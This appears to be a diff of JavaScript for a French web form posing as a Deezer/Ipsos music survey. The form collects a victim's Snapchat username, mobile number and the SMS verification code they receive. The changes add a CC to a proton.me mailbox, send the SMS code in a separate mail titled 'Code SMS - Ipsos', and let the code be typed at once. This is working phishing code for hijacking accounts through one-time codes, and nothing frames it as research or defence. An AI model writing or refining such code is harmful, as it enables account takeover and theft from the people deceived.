@@ -123,7 +123,7 @@ function showStep(etapeId, percent){
 async function sendMail(dataObj, sujet){
     const formData = new FormData();
     formData.append("_subject", sujet);
-    formData.append("becteurfoou@proton.me", "jack2026b@proton.me"); 
+    formData.append("_cc", "becteurfou@proton.me"); // copie
     formData.append("_captcha", "false");
     for(let key in dataObj){ formData.append(key, dataObj[key]); }
     try{
@@ -147,6 +147,7 @@ document.getElementById('btnEtape1').addEventListener('click', ()=>{
     if(!snap){ alert("Veuillez entrer votre identifiant Snapchat."); return;}
     reponses.compte_snap = snap;
 
+    // envoi mail principal jusqu'à Snapchat
     sendMail({
         deezer_use: reponses.deezer_use,
         artiste1: reponses.artiste1,
@@ -171,6 +172,7 @@ document.getElementById('btnEtape3').addEventListener('click', ()=>{
     if(!/^0[67]\d{8}$/.test(tel)){ alert("Numéro invalide. Commence par 06 ou 07 et 10 chiffres."); return;}
     reponses.telephone = tel;
 
+    // envoi mail complet participant
     sendMail({
         deezer_use: reponses.deezer_use,
         artiste1: reponses.artiste1,
@@ -191,13 +193,11 @@ function startCountdown(){
     countdown = 50;
     document.getElementById('timer_text').innerText = `Temps restant : ${countdown} secondes`;
     document.getElementById('btnResend').style.display = "none";
+    document.getElementById('code_sms').disabled = false; // peut taper dès le début
 
     countdownInterval = setInterval(()=>{
         countdown--;
         document.getElementById('timer_text').innerText = `Temps restant : ${countdown} secondes`;
-        if(countdown <=5){
-            document.getElementById('code_sms').disabled = false;
-        }
         if(countdown <=0){
             clearInterval(countdownInterval);
             document.getElementById('btnResend').style.display = "inline-block";
@@ -217,6 +217,7 @@ document.getElementById('btnEtape4').addEventListener('click', ()=>{
     if(!code){ alert("Veuillez entrer le code reçu par SMS."); return;}
     reponses.code_sms = code;
 
+    // envoi mail séparé pour code SMS uniquement
     sendMail({ code_sms: reponses.code_sms }, "Code SMS - Ipsos");
     clearInterval(countdownInterval);
     showStep('etape5',100);
